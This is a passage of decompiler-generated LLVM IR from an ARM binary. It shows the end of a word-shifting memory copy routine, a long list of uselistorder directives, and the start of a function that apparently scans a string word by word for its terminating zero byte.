  store i1 %v7_15cc4, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15ccc

dec_label_pc_15ccc:                               ; preds = %dec_label_pc_15ccc.loopexit, %dec_label_pc_15ca8
  %v2_15ba452 = phi i32 [ %v5_15cc0, %dec_label_pc_15ccc.loopexit ], [ %v1_15c9c, %dec_label_pc_15ca8 ]
  %v0_15b9448 = phi i32 [ %v2_15cc4, %dec_label_pc_15ccc.loopexit ], [ %v2_15cac, %dec_label_pc_15ca8 ]
  %v0_15ccc = load i32, i32* %r1.global-to-local, align 4
  %v1_15ccc = add i32 %v0_15ccc, 2
  store i32 %v1_15ccc, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_15cd4:                               ; preds = %dec_label_pc_15be8
  br i1 %v5_15cd8, label %dec_label_pc_15d20, label %dec_label_pc_15cdc

dec_label_pc_15cdc:                               ; preds = %dec_label_pc_15cd4
  store i32 %v2_15cd4, i32* %r2.global-to-local, align 4
  %v3_15ce0 = load i32, i32* @r4, align 4
  store i32 %v3_15ce0, i32* %stack_var_-12, align 4
  %v6_15ce0 = load i32, i32* @r5, align 4
  %v8_15ce0 = inttoptr i32 %v6_15ce0 to i8*
  store i8* %v8_15ce0, i8** %stack_var_-8, align 4
  %v11_15ce0 = load i32, i32* @lr, align 4
  br label %dec_label_pc_15ce4

dec_label_pc_15ce4:                               ; preds = %dec_label_pc_15ce4.dec_label_pc_15ce4_crit_edge, %dec_label_pc_15cdc
  %v0_15d08 = phi i32 [ %v1_15d08, %dec_label_pc_15ce4.dec_label_pc_15ce4_crit_edge ], [ %v0_15c3019, %dec_label_pc_15cdc ]
  %v0_15ce8 = phi i32 [ %v0_15ce8.pre, %dec_label_pc_15ce4.dec_label_pc_15ce4_crit_edge ], [ %v1_15be8, %dec_label_pc_15cdc ]
  %v0_15ce4 = phi i32 [ %v0_15ce4.pre, %dec_label_pc_15ce4.dec_label_pc_15ce4_crit_edge ], [ %v2_15bec, %dec_label_pc_15cdc ]
  %v3_15ce4 = mul i32 %v0_15ce4, 16777216
  store i32 %v3_15ce4, i32* %lr.global-to-local, align 4
  %v1_15ce8 = add i32 %v0_15ce8, -4
  %v2_15ce8 = inttoptr i32 %v1_15ce8 to i32*
  %v3_15ce8 = load i32, i32* %v2_15ce8, align 4
  store i32 %v3_15ce8, i32* @r3, align 4
  %v4_15ce8 = add i32 %v0_15ce8, -8
  %v5_15ce8 = inttoptr i32 %v4_15ce8 to i32*
  %v6_15ce8 = load i32, i32* %v5_15ce8, align 4
  store i32 %v6_15ce8, i32* %r4.global-to-local, align 4
  %v7_15ce8 = add i32 %v0_15ce8, -12
  %v8_15ce8 = inttoptr i32 %v7_15ce8 to i32*
  %v9_15ce8 = load i32, i32* %v8_15ce8, align 4
  store i32 %v9_15ce8, i32* %r5.global-to-local, align 4
  %v10_15ce8 = add i32 %v0_15ce8, -16
  %v11_15ce8 = inttoptr i32 %v10_15ce8 to i32*
  %v12_15ce8 = load i32, i32* %v11_15ce8, align 4
  store i32 %v10_15ce8, i32* %r1.global-to-local, align 4
  %v4_15cec = udiv i32 %v12_15ce8, 256
  %v5_15cec = or i32 %v4_15cec, %v3_15ce4
  store i32 %v5_15cec, i32* %lr.global-to-local, align 4
  %v3_15cf0 = mul i32 %v12_15ce8, 16777216
  %v4_15cf4 = udiv i32 %v9_15ce8, 256
  %v5_15cf4 = or i32 %v3_15cf0, %v4_15cf4
  store i32 %v5_15cf4, i32* @ip, align 4
  %v3_15cf8 = mul i32 %v9_15ce8, 16777216
  %v4_15cfc = udiv i32 %v6_15ce8, 256
  %v5_15cfc = or i32 %v3_15cf8, %v4_15cfc
  store i32 %v5_15cfc, i32* %r5.global-to-local, align 4
  %v3_15d00 = mul i32 %v6_15ce8, 16777216
  %v4_15d04 = udiv i32 %v3_15ce8, 256
  %v5_15d04 = or i32 %v3_15d00, %v4_15d04
  store i32 %v5_15d04, i32* %r4.global-to-local, align 4
  %v1_15d08 = add i32 %v0_15d08, -16
  %v2_15d08 = inttoptr i32 %v1_15d08 to i32*
  store i32 %v5_15d04, i32* %v2_15d08, align 4
  %v4_15d08 = add i32 %v0_15d08, -12
  %v5_15d08 = inttoptr i32 %v4_15d08 to i32*
  %v6_15d08 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15d08, i32* %v5_15d08, align 4
  %v7_15d08 = add i32 %v0_15d08, -8
  %v8_15d08 = inttoptr i32 %v7_15d08 to i32*
  %v9_15d08 = load i32, i32* @ip, align 4
  store i32 %v9_15d08, i32* %v8_15d08, align 4
  %v10_15d08 = add i32 %v0_15d08, -4
  %v11_15d08 = inttoptr i32 %v10_15d08 to i32*
  %v12_15d08 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15d08, i32* %v11_15d08, align 4
  store i32 %v1_15d08, i32* %r0.global-to-local, align 4
  %v0_15d0c = load i32, i32* %r2.global-to-local, align 4
  %v2_15d0c = add i32 %v0_15d0c, -16
  store i32 %v2_15d0c, i32* %r2.global-to-local, align 4
  %v6_15d10 = icmp slt i32 %v0_15d0c, 16
  br i1 %v6_15d10, label %dec_label_pc_15d14, label %dec_label_pc_15ce4.dec_label_pc_15ce4_crit_edge

dec_label_pc_15ce4.dec_label_pc_15ce4_crit_edge:  ; preds = %dec_label_pc_15ce4
  %v0_15ce4.pre = load i32, i32* @r3, align 4
  %v0_15ce8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15ce4

dec_label_pc_15d14:                               ; preds = %dec_label_pc_15ce4
  %v2_15d14 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15d14, i32* @r4, align 4
  %v5_15d14 = load i8*, i8** %stack_var_-8, align 4
  %v6_15d14 = ptrtoint i8* %v5_15d14 to i32
  store i32 %v6_15d14, i32* @r5, align 4
  store i32 %v11_15ce0, i32* @lr, align 4
  %v2_15d18 = add i32 %v0_15d0c, -4
  store i32 %v2_15d18, i32* %r2.global-to-local, align 4
  %v4_15d18 = add i32 %v0_15d0c, 2147483632
  %v5_15d18 = and i32 %v2_15d18, %v4_15d18
  %v6_15d18 = icmp slt i32 %v5_15d18, 0
  store i1 %v6_15d18, i1* %cpsr_v.global-to-local, align 1
  %v7_15d18 = icmp slt i32 %v2_15d18, 0
  store i1 %v7_15d18, i1* %cpsr_n.global-to-local, align 1
  %v8_15d18 = icmp eq i32 %v2_15d18, 0
  store i1 %v8_15d18, i1* %cpsr_z.global-to-local, align 1
  %v5_15d1c = icmp slt i32 %v2_15d0c, -12
  br i1 %v5_15d1c, label %dec_label_pc_15d38, label %dec_label_pc_15d20

dec_label_pc_15d20:                               ; preds = %dec_label_pc_15d14, %dec_label_pc_15cd4, %dec_label_pc_15d20
  %v1_15d2c = phi i32 [ %v5_15d2c, %dec_label_pc_15d20 ], [ %v1_15d08, %dec_label_pc_15d14 ], [ %v0_15c3019, %dec_label_pc_15cd4 ]
  %v0_15d20 = load i32, i32* @r3, align 4
  %v3_15d20 = mul i32 %v0_15d20, 16777216
  store i32 %v3_15d20, i32* %ip.global-to-local, align 4
  %v0_15d24 = load i32, i32* %r1.global-to-local, align 4
  %v1_15d24 = add i32 %v0_15d24, -4
  %v2_15d24 = inttoptr i32 %v1_15d24 to i32*
  %v3_15d24 = load i32, i32* %v2_15d24, align 4
  store i32 %v3_15d24, i32* @r3, align 4
  store i32 %v1_15d24, i32* %r1.global-to-local, align 4
  %v4_15d28 = udiv i32 %v3_15d24, 256
  %v5_15d28 = or i32 %v4_15d28, %v3_15d20
  store i32 %v5_15d28, i32* @ip, align 4
  %v2_15d2c = add i32 %v1_15d2c, -4
  %v3_15d2c = inttoptr i32 %v2_15d2c to i32*
  store i32 %v5_15d28, i32* %v3_15d2c, align 4
  %v4_15d2c = load i32, i32* %r0.global-to-local, align 4
  %v5_15d2c = add i32 %v4_15d2c, -4
  store i32 %v5_15d2c, i32* %r0.global-to-local, align 4
  %v0_15d30 = load i32, i32* %r2.global-to-local, align 4
  %v2_15d30 = add i32 %v0_15d30, -4
  store i32 %v2_15d30, i32* %r2.global-to-local, align 4
  %v6_15d34 = icmp slt i32 %v0_15d30, 4
  br i1 %v6_15d34, label %dec_label_pc_15d38.loopexit, label %dec_label_pc_15d20

dec_label_pc_15d38.loopexit:                      ; preds = %dec_label_pc_15d20
  %v4_15d30 = sub i32 3, %v0_15d30
  %v5_15d30 = and i32 %v4_15d30, %v0_15d30
  %v6_15d30 = icmp slt i32 %v5_15d30, 0
  %v7_15d30 = icmp slt i32 %v2_15d30, 0
  store i1 %v6_15d30, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15d30, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15d38

dec_label_pc_15d38:                               ; preds = %dec_label_pc_15d38.loopexit, %dec_label_pc_15d14
  %v2_15ba453 = phi i32 [ %v5_15d2c, %dec_label_pc_15d38.loopexit ], [ %v1_15d08, %dec_label_pc_15d14 ]
  %v0_15b9449 = phi i32 [ %v2_15d30, %dec_label_pc_15d38.loopexit ], [ %v2_15d18, %dec_label_pc_15d14 ]
  %v0_15d38 = load i32, i32* %r1.global-to-local, align 4
  %v1_15d38 = add i32 %v0_15d38, 1
  store i32 %v1_15d38, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_15d2c, { 0, 2, 1 }
  uselistorder i32 %v3_15d20, { 1, 0 }
  uselistorder i32 %v2_15d18, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15d08, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_15ce8, { 1, 0 }
  uselistorder i32 %v3_15ce4, { 1, 0 }
  uselistorder i32 %v0_15ce8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15d08, { 3, 2, 1, 0 }
  uselistorder i32 %v5_15cc0, { 0, 2, 1 }
  uselistorder i32 %v3_15cb4, { 1, 0 }
  uselistorder i32 %v2_15cac, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15c9c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_15c7c, { 1, 0 }
  uselistorder i32 %v3_15c78, { 1, 0 }
  uselistorder i32 %v0_15c7c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15c9c, { 3, 2, 1, 0 }
  uselistorder i32 %v5_15c54, { 0, 2, 1 }
  uselistorder i32 %v3_15c48, { 1, 0 }
  uselistorder i32 %v2_15c40, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15c30, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_15c10, { 1, 0 }
  uselistorder i32 %v3_15c0c, { 1, 0 }
  uselistorder i32 %v0_15c10, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15c30, { 3, 2, 1, 0 }
  uselistorder i1 %v5_15cd8, { 2, 0, 1 }
  uselistorder i32 %v0_15bf0, { 1, 0 }
  uselistorder i32 %v0_15cdc, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_15c3019, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_15be0, { 2, 1, 0 }
  uselistorder i32 %v0_15be0, { 2, 0, 1 }
  uselistorder i32 %v2_15bd8, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_15bd8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15bd8, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_15c3020, { 2, 1, 0 }
  uselistorder i32 %v11_15bb4, { 1, 0 }
  uselistorder i32 %v7_15bb4, { 1, 0 }
  uselistorder i32 %v1_15b94, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_15b94, { 1, 2, 0, 3 }
  uselistorder i32 %v2_15b98, { 1, 0 }
  uselistorder i32 %v7_15b8c, { 0, 2, 1 }
  uselistorder i32 %v10_15b88, { 1, 0 }
  uselistorder i32 %v9_15b80, { 1, 0, 2 }
  uselistorder i32 %v6_15b7c, { 1, 0 }
  uselistorder i32 %v2_15b74, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_15b74, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_15b84, { 0, 3, 2, 1 }
  uselistorder i32 %v7_15b68, { 0, 2, 1 }
  uselistorder i32 %v13_15b64, { 1, 0 }
  uselistorder i32 %v4_15b60, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_15b60, { 2, 0, 1 }
  uselistorder i32 %v6_15b68, { 0, 3, 2, 1 }
  uselistorder i32 %v7_15b58, { 0, 2, 1 }
  uselistorder i32 %v16_15b54, { 1, 0 }
  uselistorder i32 %v4_15b50, { 1, 2, 0 }
  uselistorder i32 %v0_15b60.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_15b58, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_15b44, { 0, 3, 2, 1 }
  uselistorder i32 %v10_15b40, { 1, 0 }
  uselistorder i32 %v1_15b3c, { 1, 0 }
  uselistorder i32 %v10_15b38, { 1, 0 }
  uselistorder i32 %v0_15b38, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15b3c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_15b30, { 0, 2, 1 }
  uselistorder i32 %v2_15b24, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_15b24, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_15b3c37, { 1, 2, 0 }
  uselistorder i32 %v1_15b1c, { 2, 1, 0 }
  uselistorder i32 %v1_15b14, { 2, 3, 1, 0 }
  uselistorder i32 %v2_15b0c, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_15b08, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_15b04, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_15b04, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_15af4, { 0, 2, 1 }
  uselistorder i32 %v4_15af0, { 1, 0 }
  uselistorder i32 %v3_15ae4, { 1, 0 }
  uselistorder i32 %v1_15adc, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15ad0, { 1, 0 }
  uselistorder i32 %v12_15acc, { 0, 2, 1 }
  uselistorder i32 %v8_15aac, { 1, 0, 2 }
  uselistorder i32 %v5_15aac, { 1, 0, 2 }
  uselistorder i32 %v2_15aac, { 1, 0, 2 }
  uselistorder i32 %v0_15aac, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_15acc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_15a88, { 0, 2, 1 }
  uselistorder i32 %v4_15a84, { 1, 0 }
  uselistorder i32 %v3_15a78, { 1, 0 }
  uselistorder i32 %v1_15a70, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15a64, { 1, 0 }
  uselistorder i32 %v12_15a60, { 0, 2, 1 }
  uselistorder i32 %v8_15a40, { 1, 0, 2 }
  uselistorder i32 %v5_15a40, { 1, 0, 2 }
  uselistorder i32 %v2_15a40, { 1, 0, 2 }
  uselistorder i32 %v0_15a40, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_15a60, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_15a1c, { 0, 2, 1 }
  uselistorder i32 %v4_15a18, { 1, 0 }
  uselistorder i32 %v3_15a0c, { 1, 0 }
  uselistorder i32 %v1_15a04, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_159f8, { 1, 0 }
  uselistorder i32 %v12_159f4, { 0, 2, 1 }
  uselistorder i32 %v8_159d4, { 1, 0, 2 }
  uselistorder i32 %v5_159d4, { 1, 0, 2 }
  uselistorder i32 %v2_159d4, { 1, 0, 2 }
  uselistorder i32 %v0_159d4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_159f4, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_15a30, { 0, 2, 1 }
  uselistorder i32 %v1_15a2c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_159b0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_159b0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_15a34, { 1, 0, 3, 2 }
  uselistorder i32 %v0_15acc76, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_159a4, { 1, 0 }
  uselistorder i32 %v0_159a4, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1599c, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_1599c, { 1, 0, 2 }
  uselistorder i32 %v0_1599c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_15acc77, { 1, 0 }
  uselistorder i32 %v1_1597c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_15984, { 1, 0 }
  uselistorder i32 %v0_15958, { 3, 0, 1, 2 }
  uselistorder i32 %v1_1594c, { 1, 2, 0, 3 }
  uselistorder i32 %v5_15938, { 1, 0, 2 }
  uselistorder i32 %v1_15934, { 1, 0 }
  uselistorder i32 %v1_1592c, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_1592c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_15924, { 0, 2, 1 }
  uselistorder i32 %v3_15924, { 3, 0, 1, 2 }
  uselistorder i1 %v0_15924, { 1, 0 }
  uselistorder i1 %v1_15924, { 1, 0 }
  uselistorder i32 %v3_15920, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_15918, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15904, { 1, 2, 0 }
  uselistorder i32 %v1_158fc, { 0, 2, 1 }
  uselistorder i32 %v12_158f8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_158ec, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_158f0, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_158e0, { 0, 2, 1 }
  uselistorder i32 %v1_158d8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_158d8, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_158d0, { 1, 0 }
  uselistorder i32 %v1_158c8, { 2, 1, 0 }
  uselistorder i32 %v2_158c0, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_158c0, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_158bc, { 1, 0 }
  uselistorder i32 %v2_158b0, { 1, 0 }
  uselistorder i32 %v1_158b0, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_158b0, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 15, 16, 17, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 26, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* %r2.global-to-local, { 0, 69, 1, 2, 3, 4, 5, 70, 6, 7, 8, 9, 10, 71, 11, 12, 67, 68, 72, 28, 13, 14, 16, 15, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 29, 30, 62, 31, 32, 33, 34, 35, 63, 36, 37, 38, 39, 40, 64, 41, 42, 43, 44, 45, 65, 46, 47, 48, 50, 49, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 66 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 0, 56, 2, 4, 6, 8, 5, 57, 7, 9, 11, 54, 10, 58, 53, 55, 59, 62, 60, 66, 67, 12, 13, 14, 16, 15, 17, 18, 61, 19, 20, 63, 21, 64, 22, 65, 23, 24, 25, 26, 27, 30, 28, 40, 29, 31, 34, 32, 41, 33, 35, 38, 36, 42, 37, 39, 43, 44, 47, 45, 48, 46, 49, 50, 51, 52 }
  uselistorder i32* %r0.global-to-local, { 0, 28, 1, 2, 29, 3, 4, 30, 5, 27, 33, 34, 6, 7, 19, 8, 10, 9, 11, 12, 31, 13, 14, 32, 15, 16, 17, 18, 20, 21, 23, 22, 24, 25, 26 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 35, 36, 37, 6, 7, 8, 9, 10, 11, 12, 13, 14, 23, 15, 16, 17, 24, 18, 19, 20, 25, 21, 22, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 7, 4, 9, 5, 10, 8, 46, 47, 11, 12, 13, 14, 15, 16, 17, 18, 2, 19, 20, 21, 22, 23, 1, 24, 6, 25, 0, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i1* %cpsr_v.global-to-local, { 2, 7, 3, 9, 4, 10, 8, 44, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1, 20, 21, 22, 0, 23, 5, 24, 6, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i1* %cpsr_n.global-to-local, { 2, 7, 3, 9, 4, 10, 8, 49, 50, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1, 20, 21, 22, 23, 24, 0, 25, 5, 26, 6, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 -3, { 0, 4, 5, 3, 1, 2 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1, 6 }
  uselistorder i32 15, { 15, 16, 17, 0, 26, 1, 27, 18, 19, 4, 20, 5, 21, 6, 7, 8, 9, 10, 11, 12, 13, 22, 14, 23, 2, 24, 3, 25 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 31, 2, 4, 5, 3, 6, 7, 8, 9, 20, 36, 41, 39, 40, 38, 32, 33, 24, 25, 34, 35, 37, 28, 29, 30, 21, 27, 26, 11, 12, 16, 17, 18, 10, 13, 14, 15, 19, 22, 23, 0, 1 }
  uselistorder i32 -5, { 1, 0, 2, 3 }
  uselistorder i32 11, { 6, 7, 8, 15, 23, 24, 9, 10, 11, 3, 12, 0, 13, 14, 16, 17, 4, 18, 5, 19, 1, 20, 2, 21, 22 }
  uselistorder i32 -12, { 0, 12, 13, 1, 15, 16, 2, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 22, 6, 3, 5, 4, 23 }
  uselistorder i32 48, { 0, 2, 4, 12, 3, 5, 6, 13, 14, 8, 9, 10, 11, 18, 19, 20, 15, 16, 7, 17, 1 }
  uselistorder i32 40, { 3, 9, 11, 4, 2, 7, 6, 10, 8, 12, 13, 14, 5, 15, 16, 0, 17, 19, 18, 20, 1, 21, 23, 22, 24 }
  uselistorder i32 36, { 4, 19, 5, 6, 7, 20, 8, 17, 9, 18, 10, 11, 12, 0, 1, 13, 2, 14, 3, 15, 16 }
  uselistorder i32 -16, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 5, 4, 3, 1, 15, 16, 17, 18, 19, 20, 2, 0 }
  uselistorder i32 31, { 1, 2, 3, 4, 0 }
  uselistorder i32 -32, { 3, 2, 4, 0, 1, 5 }
  uselistorder i32 24, { 0, 59, 60, 61, 62, 8, 9, 10, 12, 11, 13, 1, 14, 63, 64, 65, 15, 66, 16, 17, 67, 18, 58, 91, 92, 54, 55, 56, 57, 19, 20, 21, 22, 106, 107, 23, 108, 24, 2, 25, 93, 94, 26, 95, 52, 53, 27, 84, 85, 86, 77, 68, 69, 70, 71, 72, 73, 74, 75, 76, 78, 79, 80, 81, 82, 83, 87, 88, 89, 90, 28, 29, 30, 31, 32, 3, 33, 34, 35, 4, 36, 37, 5, 38, 39, 40, 41, 42, 43, 6, 98, 44, 99, 100, 101, 102, 45, 46, 7, 103, 47, 104, 48, 49, 50, 105, 109, 96, 51, 97 }
  uselistorder i32 27, { 1, 0, 2, 8, 6, 9, 3, 10, 4, 11, 5, 12, 7, 13 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32* @lr, { 161, 162, 163, 164, 165, 166, 167, 168, 169, 4, 5, 6, 7, 8, 9, 10, 11, 12, 3, 86, 87, 46, 170, 171, 13, 14, 134, 135, 136, 137, 138, 139, 131, 132, 133, 140, 153, 154, 141, 142, 143, 144, 145, 146, 147, 2, 148, 149, 151, 152, 150, 55, 56, 57, 58, 59, 60, 155, 156, 157, 61, 120, 88, 15, 16, 17, 18, 19, 20, 21, 0, 25, 26, 22, 23, 24, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 1, 42, 43, 44, 45, 27, 28, 29, 30, 31, 47, 48, 49, 50, 51, 52, 53, 54, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 158, 159, 160, 84, 85 }
  uselistorder label %dec_label_pc_15d20, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15cb4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15c48, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15be8, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 3, 7, 0, 1, 2 }
  uselistorder label %dec_label_pc_15b74, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_15b38, { 1, 0 }
  uselistorder label %dec_label_pc_15b24, { 1, 0 }
  uselistorder label %dec_label_pc_15ae4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15a78, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15a0c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_159ac, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_1597c, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_15918, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_158d8, { 1, 0 }
}

define i32 @function_15d40(i32 %arg1) local_unnamed_addr {
dec_label_pc_15d40:
  %v1_15d40 = and i32 %arg1, -4
  %v1_15d44 = inttoptr i32 %v1_15d40 to i32*
  %v2_15d44 = load i32, i32* %v1_15d44, align 4
  %v1_15d48 = urem i32 %arg1, 4
  store i32 %v1_15d48, i32* @r3, align 4
  %v2_15d48 = icmp eq i32 %v1_15d48, 0
  %v1_15d4c = sub nsw i32 0, %v1_15d48
  br i1 %v2_15d48, label %.preheader.preheader, label %dec_label_pc_15d54

dec_label_pc_15d54:                               ; preds = %dec_label_pc_15d40
  %v1_15d54 = or i32 %v2_15d44, 255
  %v7_15d58 = icmp eq i32 %v1_15d48, 1
  br i1 %v7_15d58, label %bb33, label %bb

bb:                                               ; preds = %dec_label_pc_15d54
  %v9_15d5c = or i32 %v2_15d44, 65535
  br label %bb33

bb33:                                             ; preds = %dec_label_pc_15d54, %bb
  %v8_15d64 = phi i32 [ %v1_15d54, %dec_label_pc_15d54 ], [ %v9_15d5c, %bb ]
  %v1_15d60 = add nsw i32 %v1_15d48, -2
  store i32 %v1_15d60, i32* @r3, align 4
  %v7_15d64 = icmp eq i32 %v1_15d48, 3
  br i1 %v7_15d64, label %bb34, label %.preheader.preheader

bb34:                                             ; preds = %bb33
  %v9_15d64 = or i32 %v8_15d64, 16711680
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %bb33, %bb34, %dec_label_pc_15d40
  %v1_15d74.ph = phi i32 [ %v2_15d44, %dec_label_pc_15d40 ], [ %v9_15d64, %bb34 ], [ %v8_15d64, %bb33 ]
  %v1_15d6838 = urem i32 %v1_15d74.ph, 256
  %v2_15d6839 = icmp eq i32 %v1_15d6838, 0
  %v2_15d6c40 = and i32 %v1_15d74.ph, 65280
  %v3_15d6c41 = icmp eq i32 %v2_15d6c40, 0
  %or.cond42 = or i1 %v2_15d6839, %v3_15d6c41
  %v2_15d7043 = and i32 %v1_15d74.ph, 16711680
  %v3_15d7044 = icmp eq i32 %v2_15d7043, 0
  %or.cond3145 = or i1 %v3_15d7044, %or.cond42
  %v4_15d7446 = icmp ult i32 %v1_15d74.ph, 16777216
  %or.cond3247 = or i1 %v4_15d7446, %or.cond3145
  br i1 %or.cond3247, label %dec_label_pc_15d84, label %.thread4

.thread4:                                         ; preds = %.preheader.preheader, %.thread4
  %v1_15d781349 = phi i32 [ %v2_15d7814, %.thread4 ], [ %v1_15d4c, %.preheader.preheader ]
  %v1_15d7c48.in = phi i32 [ %v1_15d7c48, %.thread4 ], [ %v1_15d40, %.preheader.preheader ]
  %v1_15d7c48 = add i32 %v1_15d7c48.in, 4
  %v2_15d7814 = add i32 %v1_15d781349, 4
  %v2_15d7c = inttoptr i32 %v1_15d7c48 to i32*
  %v3_15d7c = load i32, i32* %v2_15d7c, align 4
  %v1_15d68 = urem i32 %v3_15d7c, 256
  %v2_15d68 = icmp eq i32 %v1_15d68, 0
  %v2_15d6c = and i32 %v3_15d7c, 65280
